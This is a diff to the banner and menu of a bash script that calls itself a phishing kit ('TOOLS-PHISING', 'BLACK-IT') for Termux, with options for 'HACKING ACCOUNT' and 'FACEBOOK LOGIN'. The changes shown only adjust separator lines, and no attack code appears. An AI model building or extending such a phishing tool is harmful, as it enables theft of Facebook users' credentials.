@@ -8,7 +8,7 @@ pu='\033[37;1m' #putih
 ku='\033[33;1m' #kuning
 toilet -f future "TOOLS-PHISING" | lolcat
 echo $pur"Author :MR.J"
-echo $pur"____________________________________________________________________"
+echo $pur"_________________________________________________________________________________________________"
 toilet -f future "WELCOME TO TOOLS BLACK-IT"
 toilet -f term "   /\_/\ " | lolcat
 toilet -f term " =[ •~• ]= " | lolcat
@@ -22,13 +22,13 @@ toilet -f term "| |___________|     J" | lolcat
 toilet -f term "\_|_________|_/ GUNAKAN DENGAN BIJAK!!!" | lolcat
 echo $i "BLACK-IT"
 echo $i "TOOLS-PHISING"
-echo $pur"_____________________________________________________________________"
+echo $pur"_________________________________________________________________________________________________"
 sleep 1
 echo
-echo $i"BY MR.J TOOLS PHISING BLACK-IT                   |"
+echo $i"BY MR.J TOOLS PHISING BLACK-IT"
 echo $pur"[" $ku"?" $pur"]" $ku"TERMUX_INDONESIA         |"
 echo $pur"[" $ku"?" $pur"]" $ku"HACKING ACCOUNT          |"
-echo $pur"_____________________________________________________________________"
+echo $pur"_________________________________________________________________________________________________"
 echo $pur"["$ku"1"$pur"]"$ku" INSTALL ALL MODULES NEEDED"
 echo $pur"["$ku"2"$pur"]"$ku" FACEBOOK SECURITY"
 echo $pur"["$ku"3"$pur"]"$ku" FACEBOOK LOGIN"
